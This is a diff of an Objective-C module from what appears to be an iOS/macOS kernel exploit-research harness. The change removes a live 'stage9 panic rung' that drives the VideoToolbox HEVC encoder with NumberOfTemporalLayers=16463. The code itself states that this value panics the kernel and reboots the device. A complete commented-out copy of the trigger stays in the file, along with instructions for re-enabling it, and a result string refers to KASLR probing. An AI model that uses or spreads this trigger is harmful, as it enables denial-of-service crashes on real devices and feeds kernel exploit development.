@@ -294,69 +294,31 @@
         }
     }
 
-    // === AVE27 stage9: PANIC RUNG (NTL=16463) ===
-    [report appendString:@"\n--- AVE27 stage9: PANIC RUNG ---\n"];
-    [report appendString:@"WARNING: NTL=16463 WILL PANIC THE KERNEL AND REBOOT!\n"];
-    [report appendString:@"Journaling results before trigger...\n"];
+    // === stage9 PANIC RUNG — DISABLED (reboots device) ===
+    // To enable: uncomment the block below
+    // [report appendString:@"\n--- stage9: PANIC RUNG (NTL=16463) ---\n"];
+    // VTCompressionSessionRef s9 = NULL;
+    // VTCompressionSessionCreate(kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC, NULL, NULL, NULL, NULL, NULL, &s9);
+    // if (s9) {
+    //     int usage = 1, rcMode = 20, ntl = 16463;
+    //     CFNumberRef n9;
+    //     n9 = CFNumberCreate(NULL, kCFNumberIntType, &usage); VTSessionSetProperty(s9, CFSTR("EncoderUsage"), n9); CFRelease(n9);
+    //     n9 = CFNumberCreate(NULL, kCFNumberIntType, &rcMode); VTSessionSetProperty(s9, CFSTR("RCMode"), n9); CFRelease(n9);
+    //     n9 = CFNumberCreate(NULL, kCFNumberIntType, &ntl); VTSessionSetProperty(s9, CFSTR("NumberOfTemporalLayers"), n9); CFRelease(n9);
+    //     VTCompressionSessionPrepareToEncodeFrames(s9);
+    //     CVPixelBufferRef pb9 = NULL;
+    //     CVPixelBufferCreate(kCFAllocatorDefault, 640, 480, kCVPixelFormatType_32BGRA, NULL, &pb9);
+    //     if (pb9) {
+    //         VTEncodeInfoFlags f9 = 0;
+    //         VTCompressionSessionEncodeFrame(s9, pb9, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &f9);
+    //         CVPixelBufferRelease(pb9);
+    //     }
+    //     CFRelease(s9);
+    // }
 
-    // Journal before panic — the panic eats unsaved logs
-    [self journal:[NSString stringWithFormat:@"STAGE9_ARMED ntl=16463 usage=1 rc=20"]];
-    [self journal:[NSString stringWithFormat:@"NTL_SWEEP_SURVIVED 1,100,1000,8000,16000,16447,16462"]];
-
-    VTCompressionSessionRef s9 = NULL;
-    OSStatus st9 = VTCompressionSessionCreate(
-        kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC,
-        NULL, NULL, NULL, NULL, NULL, &s9);
-    if (st9 != noErr || !s9) {
-        [report appendFormat:@"stage9: session_create=%d FAILED\n", (int)st9];
-        [self journal:@"STAGE9_SESSION_FAILED"];
-    } else {
-        int usage = 1, rcMode = 20, ntl = 16463;
-        CFNumberRef n9;
-        n9 = CFNumberCreate(NULL, kCFNumberIntType, &usage);
-        VTSessionSetProperty(s9, CFSTR("EncoderUsage"), n9);
-        CFRelease(n9);
-        n9 = CFNumberCreate(NULL, kCFNumberIntType, &rcMode);
-        VTSessionSetProperty(s9, CFSTR("RCMode"), n9);
-        CFRelease(n9);
-        n9 = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
-        OSStatus set9 = VTSessionSetProperty(s9, CFSTR("NumberOfTemporalLayers"), n9);
-        CFRelease(n9);
-        int rb9 = 0;
-        CFNumberRef rbn9 = NULL;
-        VTSessionCopyProperty(s9, CFSTR("NumberOfTemporalLayers"), NULL, &rbn9);
-        if (rbn9) { CFNumberGetValue(rbn9, kCFNumberIntType, &rb9); CFRelease(rbn9); }
-        VTSessionSetProperty(s9, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
-        st9 = VTCompressionSessionPrepareToEncodeFrames(s9);
-        if (st9 != noErr) {
-            [report appendFormat:@"stage9: prepare=%d FAILED\n", (int)st9];
-            [self journal:[NSString stringWithFormat:@"STAGE9_PREPARE_FAILED st=%d", (int)st9]];
-            CFRelease(s9);
-        } else {
-            CVPixelBufferRef pb9 = NULL;
-            CVPixelBufferCreate(kCFAllocatorDefault, 640, 480, kCVPixelFormatType_32BGRA, NULL, &pb9);
-            if (!pb9) {
-                [report appendString:@"stage9: PIXELBUFFER_FAILED\n"];
-                [self journal:@"STAGE9_PIXELBUFFER_FAILED"];
-                CFRelease(s9);
-            } else {
-                CVPixelBufferLockBaseAddress(pb9, 0);
-                memset(CVPixelBufferGetBaseAddress(pb9), 0x80, CVPixelBufferGetDataSize(pb9));
-                CVPixelBufferUnlockBaseAddress(pb9, 0);
-                [report appendString:@"FIRING NTL=16463 — device may reboot here!\n"];
-                [self journal:@"STAGE9_FIRING ntl=16463"];
-                VTEncodeInfoFlags f9 = 0;
-                st9 = VTCompressionSessionEncodeFrame(s9, pb9, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &f9);
-                [report appendFormat:@"stage9: encode=%d SURVIVED (no panic!)\n", (int)st9];
-                [self journal:[NSString stringWithFormat:@"STAGE9_SURVIVED encode=%d", (int)st9]];
-                CVPixelBufferRelease(pb9);
-                VTCompressionSessionCompleteFrames(s9, kCMTimeInvalid);
-                CFRelease(s9);
-            }
-        }
-    }
-
-    [report appendString:@"\nVERDICT: H9_STAGE9_COMPLETE\n"];
+    [report appendString:@"\nVERDICT: H9_NTL_KASLR_COMPLETE\n"];
+    [report appendString:@"NOTE: stage9 (NTL=16463) DISABLED — reboots device.\n"];
+    [report appendString:@"To trigger panic: enable stage9 block in KPH9EncoderModule.m\n"];
     return report;
 }
 
